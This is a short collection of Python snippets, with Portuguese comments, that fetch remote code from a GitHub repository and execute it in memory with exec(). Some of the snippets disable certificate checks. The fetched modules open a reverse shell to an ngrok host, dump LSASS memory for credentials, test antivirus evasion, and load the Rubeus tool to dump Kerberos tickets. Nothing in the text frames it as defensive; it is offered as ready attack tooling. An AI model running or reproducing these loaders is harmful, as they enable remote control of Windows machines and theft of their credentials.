# COMMAND


import requests
import types
import urllib3

# silencia o aviso de certificado inseguro (já que você usa verify=False)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://raw.githubusercontent.com/lgcarmo/py_func/refs/heads/main/rev_shell_cmd1.py"
code = requests.get(url, verify=False).text

mod = types.ModuleType("modulo_remoto")
exec(code, mod.__dict__)

# main espera um dicionário (com chave 'name')
print(mod.rev("NGROK", PORT))

-------

import types, requests
mod = types.ModuleType("r")
exec(requests.get("https://raw.githubusercontent.com/lgcarmo/py_func/refs/heads/main/dump_lsass.py").text, mod.__dict__)
mod.dump_lsass("lsass.dmp")


----
import types, urllib.request

url = "https://raw.githubusercontent.com/lgcarmo/py_func/refs/heads/main/dump_lsass.py"
code = urllib.request.urlopen(url).read().decode()

mod = types.ModuleType("modulo_remoto")
exec(code, mod.__dict__)
mod.dump_lsass("lsass.dmp")

-------

import types, urllib.request, ssl

url = "https://raw.githubusercontent.com/lgcarmo/py_func/refs/heads/main/rev_cmd_test_av.py"
ctx = ssl._create_unverified_context()
code = urllib.request.urlopen(url, context=ctx).read().decode()

mod = types.ModuleType("av_test_mod")
exec(code, mod.__dict__)
mod.test_eicar()
mod.test_suspicious_bytes()
mod.test_openprocess()



------

import types, requests
mod = types.ModuleType("r")
exec(requests.get("https://raw.githubusercontent.com/lgcarmo/py_func/refs/heads/main/load_and_invoke_dotnet_assemblyload_and_invoke_dotnet_assembly.py").text, mod.__dict__)
mod.load_and_invoke_dotnet_assembly("Rubeus.Program", "Main", ["dump"])







